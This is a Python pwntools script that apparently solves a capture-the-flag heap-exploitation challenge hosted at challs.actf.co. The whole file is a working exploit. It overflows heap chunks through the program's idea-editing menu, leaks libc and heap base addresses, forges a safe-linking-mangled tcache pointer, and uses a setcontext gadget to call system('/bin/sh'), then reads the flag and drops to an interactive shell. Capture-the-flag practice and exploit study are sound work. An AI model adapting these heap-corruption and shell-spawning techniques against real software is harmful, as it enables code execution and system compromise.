from pwn import *
from pwnlib.tubes.tube import tube as Tube
import setcontext
import builtins

def sendlineafter(delim: bytes, val):
    match type(val):
        case builtins.int | builtins.float:
            p.sendlineafter(delim, f"{val}".encode())
        case builtins.str:
            p.sendlineafter(delim, val.encode())
        case builtins.bytes:
            p.sendlineafter(delim, val)

libc = ELF("./libc.so.6")
context.binary = file = ELF("./patched")
context.terminal = ["kitty"]
gdbscript = """
c
"""

def connect() -> Tube:
    if args.GDB:
        p = gdb.debug("./patched", gdbscript=gdbscript)
    elif args.REMOTE:
        p = remote("challs.actf.co", "31325")
    return p

def create_user(username: bytes, password: bytes, ideas: int):
    sendlineafter(b"> ", 1)
    sendlineafter(b": ", username)
    sendlineafter(b": ", password)
    sendlineafter(b"? ", ideas)

def edit_idea(idx: int, data: bytes):
    sendlineafter(b"> ", 1)
    sendlineafter(b"? ", idx)
    sendlineafter(b": ", data)

def view_idea(idx: int):
    sendlineafter(b"> ", 2)
    sendlineafter(b"? ", idx)
    return p.recvline(keepends=False)

def login(username: bytes, password: bytes):
    sendlineafter(b"> ", 2)
    sendlineafter(b": ", username)
    sendlineafter(b": ", password)

def logout():
    sendlineafter(b"> ", 4)

bits = 0xbf0

p = connect()

create_user("meow", "meow", 1)

payload = b""
payload += p64(0) * 5
payload += p64(0x8000 | bits | 1)
edit_idea(0, payload)

logout()

create_user("mrow", "mrow", 0x9000 // 8)

logout()

create_user("uwu", "uwu", 0x8000 // 8)

leak = u64(view_idea(0).ljust(8, b"\x00"))
log.info(f"{leak = :#x}")
libc.address = leak - 0x21b420

logout()

create_user("owo", "owo", 0xaf0 // 8)

leak = u64(view_idea(0).ljust(8, b"\x00"))
log.info(f"{leak = :#x}")
heapbase = leak - 0x2a070

log.info(f"{libc.address = :#x}")
log.info(f"{heapbase = :#x}")

logout()

create_user("f.f", "f.f", 3)
edit_idea(0, b"A")

logout()

create_user("q.q", "q.q", 0x1fe08 // 8)

logout()

login(b"f.f", b"f.f")
payload = b"A" * 0x1fe50
payload += p64(heapbase) * 2
payload = payload.ljust(0x1fea0)
payload += p64(0)
payload += p64(0x50 | 1)
edit_idea(0, payload)

logout()
create_user("@.@", "@.@", 0x80 // 8)

logout()

create_user("u.u", "u.u", 0x1fe48 // 8)
logout()

login(b"f.f", b"f.f")
payload = b"A" * 0x1fe50
payload += p64(heapbase) * 2
payload = payload.ljust(0x20f90)
payload += p64(heapbase) * 2
payload = payload.ljust(0x40e50)
payload += p64(heapbase) * 2
payload = payload.ljust(0x40ea0)
payload += p64(0)
payload += p64(0x50 | 1)
edit_idea(0, payload)

logout()
create_user("i.i", "i.i", 0x80 // 8)

logout()

login(b"f.f", b"f.f")

dest, stuff = setcontext.setcontext32(
    libc = libc,
    rip = libc.sym.system,
    rdi = next(libc.search(b"/bin/sh"))
)
log.info(f"{dest = :#x}")

payload = b"A" * 0x40eb0
mangle = (heapbase + 0x6afb0) >> 12
payload += p64(dest ^ mangle)
edit_idea(0, payload)
edit_idea(1, b"")
edit_idea(2, stuff)
p.sendline(b"cat flag.txt")

p.interactive()